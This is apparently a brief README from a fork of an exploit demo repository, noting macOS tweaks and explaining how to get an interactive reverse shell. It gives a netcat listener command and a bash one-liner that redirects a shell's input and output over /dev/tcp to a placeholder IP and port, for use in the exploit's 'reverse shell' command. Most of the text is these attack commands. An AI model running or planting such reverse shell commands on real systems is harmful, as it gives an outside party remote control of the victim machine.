For exploit description, please check README of original repo.

I've introduced some tweaks, so that this demo works on macOS.

For fully interactive reverse shell, you can open locally a nc listener:

```
nc -vl 1337
```

And in the 'reverse shell' exploit command open a shell with stdout redirected to network address and its stdin redirected to stdout:

```
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

